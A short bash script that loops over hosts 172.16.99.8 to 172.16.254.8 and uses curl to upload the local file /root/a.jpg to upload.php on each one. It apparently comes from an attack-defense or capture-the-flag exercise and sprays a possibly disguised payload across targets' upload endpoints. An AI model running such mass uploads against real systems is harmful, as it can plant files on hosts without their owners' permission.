#!/bin/bash
for i in {99..254}
do
	echo $i
	curl -F file=@/root/a.jpg http://172.16.$i.8/upload.php --connect-timeout 1
done
